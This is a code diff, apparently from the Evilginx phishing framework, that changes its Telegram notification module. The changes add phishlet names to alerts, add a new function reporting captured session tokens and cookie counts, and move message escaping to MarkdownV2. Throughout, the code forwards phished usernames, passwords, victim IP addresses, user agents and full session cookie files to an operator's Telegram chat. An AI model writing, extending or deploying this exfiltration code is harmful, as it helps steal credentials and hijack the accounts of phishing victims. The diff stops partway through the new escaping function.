@@ -108,7 +108,7 @@ func (t *TelegramBot) sendMessage(msg *TelegramMessage) error {
 	return nil
 }
 
-func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, userAgent, domain string) {
+func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, userAgent, domain string, phishletName string) {
 	if !t.enabled || t.botToken == "" || t.chatID == "" {
 		return
 	}
@@ -116,26 +116,26 @@ func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, use
 	timestamp := time.Now().Format("2006-01-02 15:04:05 MST")
 	
 	message := fmt.Sprintf(
-		"🎯 *Captured Session %d*\n\n"+
-			"📧 *Username:* `%s`\n"+
-			"🔑 *Password:* `%s`\n"+
-			"🌐 *IP:* `%s`\n"+
-			"📱 *User-Agent:* %s\n"+
-			"🌐 *Domain:* %s\n"+
-			"⏰ *Time:* %s",
-		sessionID,
-		escapeMarkdown(username),
-		escapeMarkdown(password),
-		ip,
-		escapeMarkdown(userAgent),
-		domain,
-		timestamp,
+		"%s capture\n\n"+
+			"📧 Username: %s\n\n"+
+			"🔑 Password: %s\n\n"+
+			"🌐 IP: %s\n\n"+
+			"📱 User-Agent: %s\n\n"+
+			"🌐 Domain: %s\n\n"+
+			"⏰ Time: %s",
+		phishletName,
+		escapeMarkdownV2(username),
+		escapeMarkdownV2(password),
+		escapeMarkdownV2(ip),
+		escapeMarkdownV2(userAgent),
+		escapeMarkdownV2(domain),
+		escapeMarkdownV2(timestamp),
 	)
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      message,
-		ParseMode: "Markdown",
+		ParseMode: "MarkdownV2",
 	}
 
 	select {
@@ -146,43 +146,32 @@ func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, use
 	}
 }
 
-func (t *TelegramBot) SendSessionUpdate(sessionID int, updateType, value, ip string) {
+func (t *TelegramBot) SendTokensCapture(sessionID int, username, password, ip, domain string, phishletName string, cookieCount int) {
 	if !t.enabled || t.botToken == "" || t.chatID == "" {
 		return
 	}
 
-	timestamp := time.Now().Format("15:04:05")
-	
-	var emoji, field string
-	switch updateType {
-	case "username":
-		emoji = "📧"
-		field = "Username"
-	case "password":
-		emoji = "🔑"
-		field = "Password"
-	default:
-		emoji = "📝"
-		field = updateType
-	}
-
 	message := fmt.Sprintf(
-		"🔔 *Session %d Update*\n\n"+
-			"%s *%s:* `%s`\n"+
-			"🌐 *IP:* `%s`\n"+
-			"⏰ *Time:* %s",
-		sessionID,
-		emoji,
-		field,
-		escapeMarkdown(value),
-		ip,
-		timestamp,
+		"%s capture\n\n"+
+			"📊 Status: Tokens Captured\n\n"+
+			"🍪 Cookies: %d\n\n"+
+			"📧 Username: %s\n\n"+
+			"🔑 Password: %s\n\n"+
+			"🌐 IP: %s\n\n"+
+			"🌐 Domain: %s\n\n"+
+			"📎 cookies attached",
+		phishletName,
+		cookieCount,
+		escapeMarkdownV2(username),
+		escapeMarkdownV2(password),
+		escapeMarkdownV2(ip),
+		escapeMarkdownV2(domain),
 	)
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      message,
-		ParseMode: "Markdown",
+		ParseMode: "MarkdownV2",
 	}
 
 	select {
@@ -197,14 +186,14 @@ func (t *TelegramBot) SendTestMessage() error {
 		return fmt.Errorf("telegram bot not configured")
 	}
 
-	message := "✅ *Evilginx2 Telegram Integration*\n\n" +
-		"This is a test message to verify your Telegram bot configuration.\n" +
-		"If you receive this message, your bot is properly configured!"
+	message := "✅ *Evilginx3 Telegram Integration*\n\n" +
+		"This is a test message to verify your Telegram bot configuration\\.\n" +
+		"If you receive this message, your bot is properly configured\\!"
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      message,
-		ParseMode: "Markdown",
+		ParseMode: "MarkdownV2",
 	}
 
 	// Send test message directly without queuing
@@ -248,7 +237,7 @@ func (t *TelegramBot) SendDocument(filePath string, caption string) error {
 		if err := writer.WriteField("caption", caption); err != nil {
 			return err
 		}
-		if err := writer.WriteField("parse_mode", "Markdown"); err != nil {
+		if err := writer.WriteField("parse_mode", "MarkdownV2"); err != nil {
 			return err
 		}
 	}
@@ -282,23 +271,24 @@ func (t *TelegramBot) SendDocument(filePath string, caption string) error {
 	return nil
 }
 
-func (t *TelegramBot) SendSessionFile(sessionID int, filePath string, username, password, ip, domain string) {
+func (t *TelegramBot) SendSessionFile(sessionID int, filePath string, username, password, ip, domain string, phishletName string) {
 	if !t.enabled || t.botToken == "" || t.chatID == "" {
 		return
 	}
 
 	caption := fmt.Sprintf(
-		"🎯 *Complete Session Capture %d*\n\n"+
-			"📧 *Username:* `%s`\n"+
-			"🔑 *Password:* `%s`\n"+
-			"🌐 *IP:* `%s`\n"+
-			"🌐 *Domain:* %s\n\n"+
-			"📎 *Attached:* Full session data with cookies",
-		sessionID,
-		escapeMarkdown(username),
-		escapeMarkdown(password),
-		ip,
-		domain,
+		"%s capture\n\n"+
+			"📊 Status: Complete Session Captured\n\n"+
+			"📧 Username: %s\n\n"+
+			"🔑 Password: %s\n\n"+
+			"🌐 IP: %s\n\n"+
+			"🌐 Domain: %s\n\n"+
+			"📎 Attached: Full session data with cookies",
+		phishletName,
+		escapeMarkdownV2(username),
+		escapeMarkdownV2(password),
+		escapeMarkdownV2(ip),
+		escapeMarkdownV2(domain),
 	)
 
 	// Send file in a goroutine to avoid blocking
@@ -329,6 +319,31 @@ func (t *TelegramBot) IsEnabled() bool {
 
 func escapeMarkdown(text string) string {
 	// Escape special Markdown characters
+	replacer := strings.NewReplacer(
+		"_", "\\_",
+		"*", "\\*",
+		"[", "\\[",
+		"]", "\\]",
+		"(", "\\(",
+		")", "\\)",
+		"~", "\\~",
+		"`", "\\`",
+		">", "\\>",
+		"#", "\\#",
+		"+", "\\+",
+		"-", "\\-",
+		"=", "\\=",
+		"|", "\\|",
+		"{", "\\{",
+		"}", "\\}",
+		".", "\\.",
+		"!", "\\!",
+	)
+	return replacer.Replace(text)
+}
+
+func escapeMarkdownV2(text string) string {
+	// Escape special MarkdownV2 characters
 	replacer := strings.NewReplacer(
 		"_", "\\_",
 		"*", "\\*",
